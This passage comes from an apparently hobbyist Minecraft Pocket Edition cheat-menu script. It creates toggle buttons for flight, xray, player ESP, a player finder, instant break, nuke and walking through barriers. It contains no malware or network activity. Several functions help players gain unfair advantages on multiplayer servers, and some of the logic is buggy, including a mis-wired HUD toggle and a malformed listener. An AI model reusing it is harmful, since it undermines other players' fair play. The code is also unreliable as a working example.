m8.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
tower ? tower = false : tower = true;
if(tower) {
m8.setTextColor(android.graphics.Color.GREEN);
tower = true;
} else {
m8.setTextColor(android.graphics.Color.RED);
tower = false;
}
}
}));
mLayout.addView(m8);

var m9 = new styleButton("Walk on liquid", "Walk on lava & water.");
if(jesus)m9.setTextColor(android.graphics.Color.GREEN);
if(!jesus)m9.setTextColor(btnText);
m9.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
jesus ? jesus = false : jesus = true;
if(jesus) {
m9.setTextColor(android.graphics.Color.GREEN);
jesus = true;
} else {
m9.setTextColor(android.graphics.Color.RED);
jesus = false;
}
}
}));
mLayout.addView(m9);

var m10 = new styleButton("Walk on air", "Walk on void blocks.\ngo up by looking up\ngo down by looking down.");
if(airwalk)m10.setTextColor(android.graphics.Color.GREEN);
if(!airwalk)m10.setTextColor(btnText);
m10.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
airwalk ? airwalk = false : airwalk = true;
if(airwalk) {
m10.setTextColor(android.graphics.Color.GREEN);
airwalk = true;
} else {
m10.setTextColor(android.graphics.Color.RED);
airwalk = false;
}
}
}));
mLayout.addView(m10);

var m11 = new styleButton("Elevator", "Teleport to a platform above you.");
if(elevator)m11.setTextColor(android.graphics.Color.GREEN);
if(!elevator)m11.setTextColor(btnText);
m11.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
elevator ? elevator = false : elevator = true;
if(elevator) {
m11.setTextColor(android.graphics.Color.GREEN);
elevator = true;
} else {
m11.setTextColor(android.graphics.Color.RED);
elevator = false;
}
}
}));
mLayout.addView(m11);

var m12 = new styleButton("Fly in survival", "Fly while in survival mode.");
if(fly1)m12.setTextColor(android.graphics.Color.GREEN);
if(!fly1)m12.setTextColor(btnText);
m12.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
fly1 ? fly1 = false : fly1 = true;
if(fly1) {
m12.setTextColor(android.graphics.Color.GREEN);
Player.setCanFly(true);
fly1 = true;
} else {
m12.setTextColor(android.graphics.Color.RED);
Player.setCanFly(false);
fly1 = false;
}
}
}));
mLayout.addView(m12);

var m13 = new styleButton("Twerk", "Automatically twerk.");
if(twerk)m13.setTextColor(android.graphics.Color.GREEN);
if(!twerk)m13.setTextColor(btnText);
m13.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
twerk ? twerk = false : twerk = true;
if(twerk) {
m13.setTextColor(android.graphics.Color.GREEN);
twerk = true;
} else {
m13.setTextColor(android.graphics.Color.RED);
twerk = false;
}
}
}));
mLayout.addView(m13);

var m14 = new styleButton("TapJump", "Tap ground to jump.");
if(tapjump)m14.setTextColor(android.graphics.Color.GREEN);
if(!tapjump)m14.setTextColor(btnText);
m14.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
tapjump ? tapjump = false : tapjump = true;
if(tapjump) {
m14.setTextColor(android.graphics.Color.GREEN);
tapjump = true;
} else {
m14.setTextColor(android.graphics.Color.RED);
tapjump = false;
}
}
}));
mLayout.addView(m14);

/*var m15 = new styleButton("Phase", "Sneak through walls.");
if(phase)m15.setTextColor(android.graphics.Color.GREEN);
if(!phase)m15.setTextColor(btnText);
m15.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
phase ? phase = false : phase = true;
if(phase) {
m15.setTextColor(android.graphics.Color.GREEN);
phase = true;
} else {
m15.setTextColor(android.graphics.Color.RED);
Entity.setCollisionSize(getPlayerEnt(), 1, 1);
phase = false;
}
}
}));
mLayout.addView(m15);*/

/*var m16 = new styleButton("Derp", "derpy.");
mLayout.addView(m16);*/

/*var m18 = new styleButton("AutoRespawn", "Spawn back if you die.");
if(autospawn)m18.setTextColor(android.graphics.Color.GREEN);
if(!autospawn)m18.setTextColor(btnText);
m18.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
autospawn ? autospawn = false : autospawn = true;
if(autospawn) {
m18.setTextColor(android.graphics.Color.GREEN);
autospawn = true;
} else {
m18.setTextColor(android.graphics.Color.RED);
autospawn = false;
}
}
}));
mLayout.addView(m18);*/

/*var m19 = new styleButton("AutoSwim", autoswim, "Automatically swim.");
mLayout.addView(m19);*/

/*var m20 = new styleButton("Fly controls", cfly, "Enable special flight buttons.");
mLayout.addView(m20);*/

var m21 = new styleButton("High jump", "Jump higher than before.");
if(highjump)m21.setTextColor(android.graphics.Color.GREEN);
if(!highjump)m21.setTextColor(btnText);
m21.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
highjump ? highjump = false : highjump = true;
if(highjump) {
m21.setTextColor(android.graphics.Color.GREEN);
highjump = true;
} else {
m21.setTextColor(android.graphics.Color.RED);
highjump = false;
}
}
}));
mLayout.addView(m21);

var m22 = new styleButton("AutoSprint", "Automatically sprint.");
if(sprint)m22.setTextColor(android.graphics.Color.GREEN);
if(!sprint)m22.setTextColor(btnText);
m22.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (viewarg) {
sprint ? sprint = false : sprint = true;
if(sprint) {
m22.setTextColor(android.graphics.Color.GREEN);
sprint = true;
} else {
m22.setTextColor(android.graphics.Color.RED);
sprint = false;
}
}
}));
mLayout.addView(m22);

var m23 = new styleButton("CrouchTP", "Teleport when sneaking.");
if(crouch)m23.setTextColor(android.graphics.Color.GREEN);
if(!crouch)m23.setTextColor(btnText);
m23.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (viewarg) {
crouch ? crouch = false : crouch = true;
if(crouch) {
m23.setTextColor(android.graphics.Color.GREEN);
crouch = true;
} else {
m23.setTextColor(android.graphics.Color.RED);
crouch = false;
}
}
}));
mLayout.addView(m23);

if(mnuOri == 0)movement = new android.widget.PopupWindow(mLayout1, android.widget.LinearLayout.LayoutParams.FILL_PARENT, android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
if(mnuOri == 1)movement = new android.widget.PopupWindow(mLayout1, MainActivity.getWindowManager().getDefaultDisplay().getWidth() / 2,MainActivity.getWindowManager().getDefaultDisplay().getHeight());

movement.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.TRANSPARENT));

var bg = new android.graphics.drawable.GradientDrawable();	bg.setColor(background);
mLayout1.setBackgroundDrawable(bg);
mLayout1.setPadding(20, 0, 20, 0);

movement.showAtLocation(MainActivity.getWindow()
.getDecorView(), android.view.Gravity.TOP, 0, 0);
} catch (error) {
android.widget.Toast.makeText(MainActivity, error, 1)
.show();
}

}
}));
}

function player_menu() {
MainActivity.runOnUiThread(new java.lang.Runnable({
run: function () {

try {
var pLayout = new android.widget.LinearLayout(MainActivity);
if(mnuOri == 0)var pScroll = new android.widget.HorizontalScrollView(MainActivity);
if(mnuOri == 1)var pScroll = new android.widget.ScrollView(MainActivity);
var pLayout1 = new android.widget.LinearLayout(MainActivity);
if(mnuOri == 0){
pLayout.setOrientation(android.widget.LinearLayout.HORIZONTAL);
pLayout1.setOrientation(android.widget.LinearLayout.HORIZONTAL);
}
if(mnuOri == 1){
pLayout.setOrientation(android.widget.LinearLayout.VERTICAL);
pLayout1.setOrientation(android.widget.LinearLayout.VERTICAL);
}
pScroll.addView(pLayout);
pLayout1.addView(pScroll);

var mx = 0;
var my = 0;
var nx = 0;
var ny = 0;
var isMoving = false;

pScroll.setOnTouchListener(new android.view.View.OnTouchListener({
onTouch: function (v, e) {
if(e.getAction() == android.view.MotionEvent.ACTION_DOWN){
my = e.getY();
mx = e.getX();
}
if(e.getAction() == android.view.MotionEvent.ACTION_MOVE){
isMoving = true;
ny = e.getRawY();
if(movable)players.update(-1, parseInt(ny)-parseInt(my), -1, -1);
}
if(e.getAction() == android.view.MotionEvent.ACTION_UP){
isMoving = false;
}
return false;
}
}));

var exit = new styleButton();
exit.setText("Back");
exit.setTextColor(android.graphics.Color.RED);
exit.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
players.dismiss();
mainMenu();
}
}));
pLayout.addView(exit);

var b15 = new styleButton("Fov", "Set your fov.");
b15.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
players.dismiss();
editFov("Fov percentage", "Change fov");
}
}));
pLayout.addView(b15);

var b17 = new styleButton("Give", "Give yourself items.");
b17.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
players.dismiss();
give("Item id", "item damage/meta", "item amount", "Give");
}
}));
pLayout.addView(b17);

var b18 = new styleButton("Effect", "Give yourself effects.");
b18.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
players.dismiss();
effect_menu();
}
}));
pLayout.addView(b18);

var b19 = new styleButton("Enchant", "Enchant your items.");
b19.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
players.dismiss();
enchant_menu();
}
}));
pLayout.addView(b19);

var b20 = new styleButton("Set offhand", "Give yourself items in your offhand slot.");
b20.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
players.dismiss();
offhand("Item id", "meta/damage", "amount", "Set");
}
}));
pLayout.addView(b20);

var items = new styleButton("Item list", "Item id list.");
items.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
var alert = new android.app.AlertDialog.Builder(MainActivity);
alert.setTitle("Item ids");
for(var i = 0; i < Block.getAllBlockIds(); i++){
alert.setMessage(Item.getName(Block.getAllBlockIds()[i], 0, true)+" - "+Block.getAllBlockIds()[i]);
}
var dialog = alert.create();
dialog.show();
}
}));
/*pLayout.addView(items);*/

var insta = new styleButton("Instant break", "Instantly break any block.");
if(instabreak)insta.setTextColor(android.graphics.Color.GREEN);
if(!instabreak)insta.setTextColor(btnText);
insta.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
instabreak ? instabreak = false : instabreak = true;
if(instabreak) {
insta.setTextColor(android.graphics.Color.GREEN);
instantBreak();
instabreak = true;
} else {
insta.setTextColor(android.graphics.Color.RED);
defaultBreak();
instabreak = false;
}
}
}));
pLayout.addView(insta);

var vdis = new styleButton("Vel display", "Display your movement.");
if(vel)vdis.setTextColor(android.graphics.Color.GREEN);
if(!vel)vdis.setTextColor(btnText);
vdis.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
vel ? vel = false : vel = true;
if(vel) {
vdis.setTextColor(android.graphics.Color.GREEN);
vel = true;
} else {
vdis.setTextColor(android.graphics.Color.RED);
vel = false;
}
}
}));
pLayout.addView(vdis);

var w7 = new styleButton("Autobreak", "Automatically break blocks you look at.");
if(autobreak)w7.setTextColor(android.graphics.Color.GREEN);
if(!autobreak)w7.setTextColor(btnText);
w7.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
autobreak ? autobreak = false : autobreak = true;
if(autobreak) {
w7.setTextColor(android.graphics.Color.GREEN);
autobreak = true;
} else {
w7.setTextColor(android.graphics.Color.RED);
autobreak = false;
}
}
}));
pLayout.addView(w7);

var p1 = new styleButton("Saddle", "Ride anything you hit.");
if(saddle)p1.setTextColor(android.graphics.Color.GREEN);
if(!saddle)p1.setTextColor(btnText);
p1.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
saddle ? saddle = false : saddle = true;
if(saddle) {
p1.setTextColor(android.graphics.Color.GREEN);
saddle = true;
} else {
p1.setTextColor(android.graphics.Color.RED);
saddle = false;
}
}
}));
pLayout.addView(p1);

if(mnuOri == 0)players = new android.widget.PopupWindow(pLayout1, android.widget.LinearLayout.LayoutParams.FILL_PARENT, android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
if(mnuOri == 1)players = new android.widget.PopupWindow(pLayout1, MainActivity.getWindowManager().getDefaultDisplay().getWidth() / 2,MainActivity.getWindowManager().getDefaultDisplay().getHeight());

players.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.TRANSPARENT));

var bg = new android.graphics.drawable.GradientDrawable();	bg.setColor(background);
pLayout1.setBackgroundDrawable(bg);
pLayout1.setPadding(20, 0, 20, 0);

players.showAtLocation(MainActivity.getWindow()
.getDecorView(), android.view.Gravity.TOP, 0, 0);
} catch (error) {
android.widget.Toast.makeText(MainActivity, error, 1)
.show();
}

}
}));
}

function render_menu() {
MainActivity.runOnUiThread(new java.lang.Runnable({
run: function () {

try {
var rLayout = new android.widget.LinearLayout(MainActivity);
if(mnuOri == 0)var rScroll = new android.widget.HorizontalScrollView(MainActivity);
if(mnuOri == 1)var rScroll = new android.widget.ScrollView(MainActivity);
var rLayout1 = new android.widget.LinearLayout(MainActivity);
if(mnuOri == 0){
rLayout.setOrientation(android.widget.LinearLayout.HORIZONTAL);
rLayout1.setOrientation(android.widget.LinearLayout.HORIZONTAL);
}
if(mnuOri == 1){
rLayout.setOrientation(android.widget.LinearLayout.VERTICAL);
rLayout1.setOrientation(android.widget.LinearLayout.VERTICAL);
}
rScroll.addView(rLayout);
rLayout1.addView(rScroll);

var exit = new styleButton("Back");
exit.setTextColor(android.graphics.Color.RED);
exit.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
renders.dismiss();
mainMenu();
}
}));
rLayout.addView(exit);

var c17 = new styleButton("Player ESP", "Player ESP from dragop thanks to godsoft.");
if(esp1)c17.setTextColor(android.graphics.Color.GREEN);
if(!esp1)c17.setTextColor(btnText);
c17.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
esp1 ? esp1 = false : esp1 = true;
if(esp1) {
c17.setTextColor(android.graphics.Color.GREEN);
esp1 = true;
var entry = getPlayerEnt();
players = Server.getAllPlayers();
refreshToggle();
} else {
c17.setTextColor(android.graphics.Color.RED);
esp1 = false;
refreshToggle();
}
}
}));
rLayout.addView(c17);

var c18 = new styleButton("Mob ESP", "Draw boxes around nearby mobs.");
if(esp3)c18.setTextColor(android.graphics.Color.GREEN);
if(!esp3)c18.setTextColor(btnText);
c18.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
esp3 ? esp3 = false : esp3 = true;
if(esp3) {
c18.setTextColor(android.graphics.Color.GREEN);
esp3 = true;
mobs = Entity.getAll();
} else {
c18.setTextColor(android.graphics.Color.RED);
esp3 = false;
}
}
}));
rLayout.addView(c18);

var fuckyou = new styleButton("CustomESP", "CustomESP from dragop thanks to godsoft.");
if(esp2)fuckyou.setTextColor(android.graphics.Color.GREEN);
if(!esp2)fuckyou.setTextColor(btnText);
fuckyou.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
esp2 ? esp2 = false : esp2 = true;
if(esp2) {
fuckyou.setTextColor(android.graphics.Color.GREEN);
esp2 = true;
} else {
fuckyou.setTextColor(android.graphics.Color.RED);
esp2 = false;
}
}
}));
rLayout.addView(fuckyou);

var skiboi = new styleButton("Item ESP", "Draw boxes around dropped items.");
if(esp4)skiboi.setTextColor(android.graphics.Color.GREEN);
if(!esp4)skiboi.setTextColor(btnText);
skiboi.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
esp4 ? esp4 = false : esp4 = true;
if(esp4) {
skiboi.setTextColor(android.graphics.Color.GREEN);
esp4 = true;
entry = getPlayerEnt();
items = Entity.getAll();
} else {
skiboi.setTextColor(android.graphics.Color.RED);
esp4 = false;
}
}
}));
rLayout.addView(skiboi);

var espc = new styleButton("CustomESP(Particle)", "Draw a particle line to nearby blocks.");
if(chestesp)espc.setTextColor(android.graphics.Color.GREEN);
if(!chestesp)espc.setTextColor(btnText);
espc.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
chestesp ? chestesp = false : chestesp = true;
if(chestesp) {
espc.setTextColor(android.graphics.Color.GREEN);
chestesp = true;
} else {
espc.setTextColor(android.graphics.Color.RED);
chestesp = false;
}
}
}));
rLayout.addView(espc);

if(mnuOri == 0)renders = new android.widget.PopupWindow(rLayout1, android.widget.LinearLayout.LayoutParams.FILL_PARENT, android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
if(mnuOri == 1)renders = new android.widget.PopupWindow(rLayout1, MainActivity.getWindowManager().getDefaultDisplay().getWidth() / 2,MainActivity.getWindowManager().getDefaultDisplay().getHeight());

renders.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.TRANSPARENT));

var bg = new android.graphics.drawable.GradientDrawable();	bg.setColor(background);
rLayout1.setBackgroundDrawable(bg);
rLayout1.setPadding(20, 0, 20, 0);

renders.showAtLocation(MainActivity.getWindow()
.getDecorView(), android.view.Gravity.TOP, 0, 0);
} catch (error) {
android.widget.Toast.makeText(MainActivity, error, 1)
.show();
}

}
}));
}

function world_menu() {
MainActivity.runOnUiThread(new java.lang.Runnable({
run: function () {

try {
var wLayout = new android.widget.LinearLayout(MainActivity);
if(mnuOri == 0)var wScroll = new android.widget.HorizontalScrollView(MainActivity);
if(mnuOri == 1)var wScroll = new android.widget.ScrollView(MainActivity);
var wLayout1 = new android.widget.LinearLayout(MainActivity);
if(mnuOri == 0){
wLayout.setOrientation(android.widget.LinearLayout.HORIZONTAL);
wLayout1.setOrientation(android.widget.LinearLayout.HORIZONTAL);
}
if(mnuOri == 1){
wLayout.setOrientation(android.widget.LinearLayout.VERTICAL);
wLayout1.setOrientation(android.widget.LinearLayout.VERTICAL);
}
wScroll.addView(wLayout);
wLayout1.addView(wScroll);

var mx = 0;
var my = 0;
var nx = 0;
var ny = 0;
var isMoving = false;

wScroll.setOnTouchListener(new android.view.View.OnTouchListener({
onTouch: function (v, e) {
if(e.getAction() == android.view.MotionEvent.ACTION_DOWN){
my = e.getY();
mx = e.getX();
}
if(e.getAction() == android.view.MotionEvent.ACTION_MOVE){
isMoving = true;
ny = e.getRawY();
if(movable)worlds.update(-1, parseInt(ny)-parseInt(my), -1, -1);
}
if(e.getAction() == android.view.MotionEvent.ACTION_UP){
isMoving = false;
}
return false;
}
}));

var exit = new styleButton();
exit.setText("Back");
exit.setTextColor(android.graphics.Color.RED);
exit.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
worlds.dismiss();
mainMenu();
}
}));
wLayout.addView(exit);

var mobs_0 = [];
var mobs0 = {
select: [0, -1],
list: [["Chicken"],["Cow"],["Pig"],["Sheep"],["Wolf"],["Polar bear"],["Ocelot"],["Mooshroom"],["Bat"],["Parrot"],["Rabbit"],["Llama"],["Horse"],["Donkey"],["Mule"],["Skeleton horse"],["Zombie horse"],["Tropical fish"],["Cod"],["Pufferfish"],["Salmon"],["Dolphin"],["Creeper"],["Enderman"],["Silverfish"],["Skeleton"],["Wither skeleton"],["Stray"],["Slime"],["Spider"],["Zombie"],["Zombie pigman"],["Husk"],["Squid"],["Cave spider"],["Witch"],["Guardian"],["Elder guardian"],["Endermite"],["Magma cube"],["Ghast"],["Blaze"],["Shulker"],["Vindicator"],["Evoker"],["Vex"],["Villager"],["Zombie villager"]]
}
mobs0.list.forEach(function (entry, index) {
mobs_0.push(mobs0.list[index][0]);
});

var adapter = new android.widget.ArrayAdapter(MainActivity, android.R.layout.simple_list_item_1, mobs_0);

var eggs = new styleButton("Spawn mobs", "Spawn any mob.");
eggs.setOnClickListener(new android.view.View.OnClickListener() ,{
onClick: function (v) {
var alert = new android.app.AlertDialog.Builder(MainActivity);
alert.setTitle("Select a mob");
alert.setAdapter(adapter, new android.content.DialogInterface.OnClickListener({
onClick: function (v, pos) {
var x = getPlayerX();
var y = getPlayerY();
var z = getPlayerZ();
if(pos == 0)Level.spawnMob(x,y,z,10,null);
if(pos == 1)Level.spawnMob(x,y,z,11,null);
if(pos == 2)Level.spawnMob(x,y,z,12,null);
if(pos == 3)Level.spawnMob(x,y,z,13,null);
if(pos == 4)Level.spawnMob(x,y,z,14,null);
if(pos == 5)Level.spawnMob(x,y,z,28,null);
if(pos == 6)Level.spawnMob(x,y,z,22,null);
if(pos == 7)Level.spawnMob(x,y,z,16,null);
if(pos == 8)Level.spawnMob(x,y,z,19,null);
if(pos == 9)Level.spawnMob(x,y,z,30,null);
if(pos == 10)Level.spawnMob(x,y,z,18,null);
if(pos == 11)Level.spawnMob(x,y,z,29,null);
if(pos == 12)Level.spawnMob(x,y,z,23,null);
if(pos == 13)Level.spawnMob(x,y,z,24,null);
if(pos == 14)Level.spawnMob(x,y,z,25,null);
if(pos == 15)Level.spawnMob(x,y,z,26,null);
if(pos == 16)Level.spawnMob(x,y,z,27,null);
if(pos == 17)Level.spawnMob(x,y,z,111,null);
if(pos == 18)Level.spawnMob(x,y,z,112,null);
if(pos == 19)Level.spawnMob(x,y,z,108,null);
if(pos == 20)Level.spawnMob(x,y,z,109,null);
if(pos == 21)Level.spawnMob(x,y,z,31,null);
if(pos == 22)Level.spawnMob(x,y,z,33,null);
if(pos == 23)Level.spawnMob(x,y,z,38,null);
if(pos == 24)Level.spawnMob(x,y,z,39,null);
if(pos == 25)Level.spawnMob(x,y,z,34,null);
if(pos == 26)Level.spawnMob(x,y,z,48,null);
if(pos == 27)Level.spawnMob(x,y,z,46,null);
if(pos == 28)Level.spawnMob(x,y,z,37,null);
if(pos == 29)Level.spawnMob(x,y,z,35,null);
if(pos == 30)Level.spawnMob(x,y,z,32,null);
if(pos == 31)Level.spawnMob(x,y,z,36,null);
if(pos == 47)Level.spawnMob(x,y,z,47,null);
if(pos == 48)Level.spawnMob(x,y,z,17,null);
if(pos == 49)Level.spawnMob(x,y,z,40,null);
if(pos == 50)Level.spawnMob(x,y,z,45,null);
if(pos == 51)Level.spawnMob(x,y,z,49,null);
if(pos == 52)Level.spawnMob(x,y,z,50,null);
if(pos == 53)Level.spawnMob(x,y,z,55,null);
if(pos == 54)Level.spawnMob(x,y,z,42,null);
if(pos == 55)Level.spawnMob(x,y,z,41,null);
if(pos == 56)Level.spawnMob(x,y,z,43,null);
if(pos == 57)Level.spawnMob(x,y,z,54,null);
if(pos == 58)Level.spawnMob(x,y,z,57,null);
if(pos == 59)Level.spawnMob(x,y,z,104,null);
if(pos == 60)Level.spawnMob(x,y,z,105,null);
if(pos == 61)Level.spawnMob(x,y,z,15,null);
if(pos == 62)Level.spawnMob(x,y,z,44,null);
}
}));
var dialog = alert.create();
dialog.show();
}
});
wLayout.addView(eggs);

var b9 = new styleButton("HUD", "Display coords, time, held item ids, facing ids & more.");
if(hud)b9.setTextColor(android.graphics.Color.GREEN);
if(!hud)b9.setTextColor(btnText);
b9.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
hud ? hud = false : hud = true;
if(hud) {
b9.setTextColor(android.graphics.Color.GREEN);
instabreak = true;
} else {
b9.setTextColor(android.graphics.Color.RED);
instabreak = false;
}
}
}));
wLayout.addView(b9);

var oray = new styleButton("Xray", "Change all blocks render to transparent.");
if(xray)oray.setTextColor(android.graphics.Color.GREEN);
if(!xray)oray.setTextColor(btnText);
oray.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
xray ? xray = false : xray = true;
if(xray) {
oray.setTextColor(android.graphics.Color.GREEN);
xray = true;
} else {
oray.setTextColor(android.graphics.Color.RED);
xray = false;
}
}
}));
wLayout.addView(oray);

var aplist = new styleButton("Nearby coords", "Show a list of possible nearby players.");
aplist.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
worlds.dismiss();
aList();
}
}));
wLayout.addView(aplist);

var b12 = new styleButton("Player finder", "Display coords when a player enters the same chunk as you.\n(This may only work with toolbox.)");
if(find)b12.setTextColor(android.graphics.Color.GREEN);
if(!find)b12.setTextColor(btnText);
b12.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
find ? find = false : find = true;
if(find) {
b12.setTextColor(android.graphics.Color.GREEN);
find = true;
} else {
b12.setTextColor(android.graphics.Color.RED);
find = false;
}
}
}));
if(ctx.getPackageName() == "io.mrarm.mctoolbox")wLayout.addView(b12);

var tele = new styleButton("Teleport", "Teleport to select coords.");
tele.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
worlds.dismiss();
teleport("x", "y", "z", "teleport");
}
}));
wLayout.addView(tele);

var sspawn = new styleButton("Set spawn", "Set spawn point.");
sspawn.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
Level.setSpawn(getPlayerX(), getPlayerY(), getPlayerZ());
}
}));
wLayout.addView(sspawn);

var m17 = new styleButton("Nullify doors/gates", "Walk through doors & gates.");
if(nullify2)m17.setTextColor(android.graphics.Color.GREEN);
if(!nullify2)m17.setTextColor(btnText);
m17.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
nullify2 ? nullify2 = false : nullify2 = true;
if(nullify2) {
m17.setTextColor(android.graphics.Color.GREEN);
Block.setShape(0, null, null, null, null, null, null);
Block.setShape(107, null, null, null, null, null, null);
Block.setShape(324, null, null, null, null, null, null);
Block.setShape(330, null, null, null, null, null, null);
Block.setShape(96, null, null, null, null, null, null);
Block.setShape(167, null, null, null, null, null, null);
nullify2 = true;
} else {
m17.setTextColor(android.graphics.Color.RED);
Block.setShape(0, 1, 1, 1, 1, 1, 1);
Block.setShape(107, 1, 1, 1, 1, 1, 1);
Block.setShape(324, 1, 1, 1, 1, 1, 1);
Block.setShape(330, 1, 1, 1, 1, 1, 1);
Block.setShape(96, 1, 1, 1, 1, 1, 1);
Block.setShape(167, 1, 1, 1, 1, 1, 1);
nullify2 = false;
}
}
}));
wLayout.addView(m17);

var nibby = new styleButton("Nullify barriers", "Walk through barriers.");
if(nullify)nibby.setTextColor(android.graphics.Color.GREEN);
if(!nullify)nibby.setTextColor(btnText);
nibby.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
nullify ? nullify = false : nullify = true;
if(nullify) {
nibby.setTextColor(android.graphics.Color.GREEN);
Block.setShape(0, null, null, null, null, null, null);
Block.setShape(65, null, null, null, null, null, null);
Block.setShape(95, null, null, null, null, null, null);
Block.setShape(255, null, null, null, null, null, null);
nullify = true;
} else {
nibby.setTextColor(android.graphics.Color.RED);
Block.setShape(0, 1, 1, 1, 1, 1, 1);
Block.setShape(65, 1, 1, 1, 1, 1, 1);
Block.setShape(95, 1, 1, 1, 1, 1, 1);
Block.setShape(255, 1, 1, 1, 1, 1, 1);
nullify = false;
}
}
}));
wLayout.addView(nibby);

/*var w1 = new styleButton("Sign editor", "Tap a sign to edit it.");
sign
wLayout.addView(w1);

var w2 = new styleButton("AutoSign", "Automatically add text to placed signs.");
autosign
wLayout.addView(w2);

var w3 = new styleButton("AutoTool", "Automatically select a tool in hotbar when facing the right block.");
autotool
wLayout.addView(w3);*/

var w4 = new styleButton("Brightness", "Set all blocks light level to torch level.\n(I suggest relogging to see results.)");
if(bright)w4.setTextColor(android.graphics.Color.GREEN);
if(!bright)w4.setTextColor(btnText);
w4.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
bright ? bright = false : bright = true;
if(bright) {
w4.setTextColor(android.graphics.Color.GREEN);
bright = true;
brightness();
} else {
w4.setTextColor(android.graphics.Color.RED);
bright = false;
}
}
}));
wLayout.addView(w4);

var w6 = new styleButton("Nuke", "Explode blocks around you.");
if(nuke)w6.setTextColor(android.graphics.Color.GREEN);
if(!nuke)w6.setTextColor(btnText);
w6.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
nuke ? nuke = false : nuke = true;
if(nuke) {
w6.setTextColor(android.graphics.Color.GREEN);
nuke = true;
} else {
w6.setTextColor(android.graphics.Color.RED);
nuke = false;
}
}
}));
wLayout.addView(w6);

if(mnuOri == 0)worlds = new android.widget.PopupWindow(wLayout1, android.widget.LinearLayout.LayoutParams.FILL_PARENT, android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
if(mnuOri == 1)worlds = new android.widget.PopupWindow(wLayout1, MainActivity.getWindowManager().getDefaultDisplay().getWidth() / 2,MainActivity.getWindowManager().getDefaultDisplay().getHeight());

worlds.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.TRANSPARENT));

var bg = new android.graphics.drawable.GradientDrawable();	bg.setColor(background);
wLayout1.setBackgroundDrawable(bg);
wLayout1.setPadding(20, 0, 20, 0);

worlds.showAtLocation(MainActivity.getWindow()
.getDecorView(), android.view.Gravity.TOP, 0, 0);
} catch (error) {
android.widget.Toast.makeText(MainActivity, error, 1)
.show();
}

}
}));
}

function other_menu() {
MainActivity.runOnUiThread(new java.lang.Runnable({
run: function () {

try {
var oLayout = new android.widget.LinearLayout(MainActivity);
if(mnuOri == 0)var oScroll = new android.widget.HorizontalScrollView(MainActivity);
if(mnuOri == 1)var oScroll = new android.widget.ScrollView(MainActivity);
var oLayout1 = new android.widget.LinearLayout(MainActivity);
if(mnuOri == 0){
oLayout.setOrientation(android.widget.LinearLayout.HORIZONTAL);
oLayout1.setOrientation(android.widget.LinearLayout.HORIZONTAL);
}
if(mnuOri == 1){
oLayout.setOrientation(android.widget.LinearLayout.VERTICAL);
oLayout1.setOrientation(android.widget.LinearLayout.VERTICAL);
}
oScroll.addView(oLayout);
oLayout1.addView(oScroll);

var mx = 0;
var my = 0;
var nx = 0;
var ny = 0;
var isMoving = false;

oScroll.setOnTouchListener(new android.view.View.OnTouchListener({
onTouch: function (v, e) {
if(e.getAction() == android.view.MotionEvent.ACTION_DOWN){
my = e.getY();
mx = e.getX();
}
if(e.getAction() == android.view.MotionEvent.ACTION_MOVE){
isMoving = true;
ny = e.getRawY();
if(movable)others.update(-1, parseInt(ny)-parseInt(my), -1, -1);
}
if(e.getAction() == android.view.MotionEvent.ACTION_UP){
isMoving = false;
}
return false;
}
}));

var exit = new styleButton();
exit.setText("Back");
exit.setTextColor(android.graphics.Color.RED);
exit.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
others.dismiss();
mainMenu();
}
}));
oLayout.addView(exit);

var dchat = new styleButton("Chat", "Built-in chat.");
dchat.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
others.dismiss();
ShadowChat();
}
}));
/*oLayout.addView(dchat);*/

var updatess = new styleButton("Changelog", "All past updates.");
updatess.setOnClickListener(new android.view.View.OnClickListener({
